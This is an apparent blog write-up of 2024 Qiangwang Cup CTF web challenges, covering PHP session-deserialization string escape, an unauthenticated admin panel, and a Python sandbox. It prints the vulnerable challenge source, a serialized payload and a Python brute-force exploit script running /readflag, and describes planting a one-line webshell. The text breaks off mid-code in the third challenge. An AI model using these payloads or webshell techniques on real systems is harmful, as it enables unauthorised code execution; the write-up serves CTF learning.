      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024强网杯复现wp</title>
    <link href="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/"/>
    <url>/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h2><p>打开只有登录框，扫描目录发现源码<a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;user.php&#x27;</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br><br><span class="hljs-variable">$sessionManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionManager</span>();<br><span class="hljs-variable">$SessionRandom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionRandom</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session_key&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session_key&#x27;</span>] =<span class="hljs-variable">$SessionRandom</span> -&gt; <span class="hljs-title function_ invoke__">generateRandomString</span>();<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-variable">$password</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$sessionManager</span>-&gt;<span class="hljs-title function_ invoke__">filterSensitiveFunctions</span>();<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: dashboard.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;login.php&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notouchitsclass</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$data</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;data);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SessionRandom</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>);<br><br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;<br>    <span class="hljs-variable">$charactersLength</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>);<br>    <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$charactersLength</span> - <span class="hljs-number">1</span>)];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SessionManager</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sessionPath</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sessionId</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sensitiveFunctions</span> = [<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;proc_open&#x27;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">session_status</span>() == PHP_SESSION_NONE) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Session has not been started. Please start a session before using this class.&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;sessionPath = <span class="hljs-title function_ invoke__">session_save_path</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;sessionId = <span class="hljs-title function_ invoke__">session_id</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSessionFilePath</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;sessionPath . <span class="hljs-string">&quot;/sess_&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;sessionId;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterSensitiveFunctions</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$sessionFile</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getSessionFilePath</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$sessionFile</span>)) &#123;<br>            <span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$sessionFile</span>);<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;sensitiveFunctions <span class="hljs-keyword">as</span> <span class="hljs-variable">$function</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sessionData</span>, <span class="hljs-variable">$function</span>) !== <span class="hljs-literal">false</span>) &#123;<br>                    <span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$function</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$sessionData</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sessionFile</span>, <span class="hljs-variable">$sessionData</span>);<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Session file not found.&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//dashboard.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;任何人都可以登录的平台&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background-color: <span class="hljs-comment">#f0f4f8;</span><br>            font-family: Arial, sans-serif;<br>            display: flex;<br>            flex-direction: column;<br>            align-items: center;<br>            justify-content: center;<br>            height: <span class="hljs-number">100</span>vh;<br>            margin: <span class="hljs-number">0</span>;<br>            text-align: center;<br>        &#125;<br>        h1 &#123;<br>            color: <span class="hljs-comment">#333;</span><br>            margin-bottom: <span class="hljs-number">20</span>px;<br>        &#125;<br>        p &#123;<br>            color: <span class="hljs-comment">#555;</span><br>            font-size: <span class="hljs-number">18</span>px;<br>            margin: <span class="hljs-number">0</span>;<br>        &#125;<br>        .session-info &#123;<br>            background-color: <span class="hljs-comment">#fff;</span><br>            border-radius: <span class="hljs-number">10</span>px;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">4</span>px <span class="hljs-number">10</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);<br>            padding: <span class="hljs-number">20</span>px;<br>            width: <span class="hljs-number">300</span>px;<br>            margin-top: <span class="hljs-number">20</span>px;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;欢迎来到任何人都可以登录的平台&lt;/h1&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">session</span>-<span class="hljs-title">info</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">p</span>&gt;你好，&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">user</span>&#x27;]); ?&gt;！&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>从上面三个php文件可以判断这道题很可能和session反序列化相关，但这里和常规的session反序列化稍有不同，这里没有使用不同的引擎进行序列化。</p><p>发现这里有个过滤函数会对session文件中的敏感字符进行替换，这很像php反序列化的字符串逃逸。</p><p>没错，这道题的解法就是二者的融合，在session的反序列化的时候用字符串进行逃逸，触发__destruct()函数，实现命令执行。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>|s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;litt1e-ice&quot;</span>;session_key|s:<span class="hljs-number">49</span>:<span class="hljs-string">&quot;62MJUzTLoyD8ZL7TMi89SjlIe8RSI9PKKYuCHMGb904mIWoVe&quot;</span>;password|s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<br></code></pre></td></tr></table></figure><p>这是登录后对应session文件中保存的序列，其中session_key的长度是随机的，所以之后脚本要一直跑靠运气撞。</p><p>可以构想在user中加入一定长度的敏感字符，如system，在password里面写上希望反序列化的对象。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coq">user|<span class="hljs-type">s</span>:<span class="hljs-number">38</span>:<span class="hljs-string">&quot;systemsystemsystemsystemsystemsystemexecexec&quot;</span>;session_key|<span class="hljs-type">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ui&quot;</span>;password|<span class="hljs-type">s</span>:<span class="hljs-number">73</span>:<span class="hljs-string">&quot;;password|O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:16:&quot;</span>echo `/readflag`;<span class="hljs-string">&quot;;&#125;;&quot;</span>;<br>一共逃逸<span class="hljs-number">38</span>个字符，过滤后为：<br>user|<span class="hljs-type">s</span>:<span class="hljs-number">38</span>:<span class="hljs-string">&quot;&quot;</span>;session_key|<span class="hljs-type">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ui&quot;</span>;password|<span class="hljs-type">s</span>:<span class="hljs-number">73</span>:<span class="hljs-string">&quot;;password|O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:16:&quot;</span>echo `/readflag`;<span class="hljs-string">&quot;;&#125;;&quot;</span>;<br>这样password反序列化的时候就是notouchitsclass对象了<br></code></pre></td></tr></table></figure><p>脚步如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><span class="hljs-comment">#url = &quot;http://eci-2zeg97hlr4shg75wqoyp.cloudeci1.ichunqiu.com:80&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;exec&quot;</span>*<span class="hljs-number">9</span>+<span class="hljs-string">&quot;popen&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&#x27;;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:28:&quot;syssystemtem(&quot;/readflag;ls -alh&quot;);&quot;;&#125;user|s:1:&quot;1aaaa&#x27;</span><br>    &#125;<br>    sess = os.urandom(<span class="hljs-number">8</span>).<span class="hljs-built_in">hex</span>()<br>    r = requests.post(url + <span class="hljs-string">&quot;/index.php&quot;</span>, data=data, headers=&#123;   <span class="hljs-comment">#本地测试后发现第一次请求index.php会生成session文件</span><br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)   <span class="hljs-comment">#第二次请求index.php才会过滤，但我本地测试的时候直接变成空的了，不知道怎么回事</span><br>    r = requests.post(url + <span class="hljs-string">&quot;/index.php&quot;</span>, data=data, headers=&#123; <span class="hljs-comment">#第三次请求dashboard.php才会有反序列化的回显</span><br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    r = requests.post(url + <span class="hljs-string">&quot;/dashboard.php&quot;</span>, data=data, headers=&#123;<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">f&quot;PHPSESSID=<span class="hljs-subst">&#123;sess&#125;</span>&quot;</span>&#125;, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    text = r.text<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;total &#x27;</span> <span class="hljs-keyword">in</span> text:<br>        <span class="hljs-built_in">print</span>(text)<br>        <span class="hljs-built_in">print</span>(sess)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>本地测试后发现第一次请求index.php会生成session文件，第二次请求index.php才会过滤，但我本地测试的时候直接变成空的了，不知道怎么回事，第三次请求dashboard.php才会有反序列化的回显，因为session反序列化是在session_start()的时候进行的;include(“class.php”);得放在session_start()的前面才行，不然反序列化的时候都不知道这个定义的类是什么样的。</p><h2 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h2><p>扫描目录发现后台未授权：<a href="http://47.94.195.201:22547/admin/admins/">http://47.94.195.201:22547/admin/admins/</a></p><p>这有点铸币了</p><p>支付设置里面直接使用php代码，直接修改成一句话木马</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640.webp" alt="图片"></p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640-1730774028307-1.webp" alt="图片"></p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640-1730774028307-2.webp" alt="图片"></p><p>成功执行，使用蚁剑连接，拿到flag</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/640-1730774028308-3.webp" alt="图片"></p><h2 id="pyblockly"><a href="#pyblockly" class="headerlink" title="pyblockly"></a>pyblockly</h2><p>打开后的界面如下</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/image-20241105162252800.png" alt="image-20241105162252800"></p><p>源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> unidecode<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> importlib.util<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="hljs-literal">False</span><br><br>blacklist_pattern = <span class="hljs-string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">module_exists</span>(<span class="hljs-params">module_name</span>):<br><br>    spec = importlib.util.find_spec(module_name)<br>    <span class="hljs-keyword">if</span> spec <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> module_name <span class="hljs-keyword">in</span> sys.builtin_module_names:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">if</span> spec.origin:<br>        std_lib_path = os.path.dirname(os.__file__)<br>        <br>        <span class="hljs-keyword">if</span> spec.origin.startswith(std_lib_path) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> spec.origin.startswith(os.getcwd()):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_secure</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> ast.walk(m):<br>        <span class="hljs-keyword">match</span> <span class="hljs-built_in">type</span>(node):<br>            <span class="hljs-keyword">case</span> ast.Import:  <br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR: Banned module &quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">case</span> ast.ImportFrom: <br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ERROR: Banned module <span class="hljs-subst">&#123;node.module&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_for_blacklisted_symbols</span>(<span class="hljs-params">input_text</span>):<br>    <span class="hljs-keyword">if</span> re.search(blacklist_pattern, input_text):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">block_to_python</span>(<span class="hljs-params">block</span>):<br>    block_type = block[<span class="hljs-string">&#x27;type&#x27;</span>]<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    <br>    <span class="hljs-keyword">if</span> block_type == <span class="hljs-string">&#x27;print&#x27;</span>:<br>        text_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span 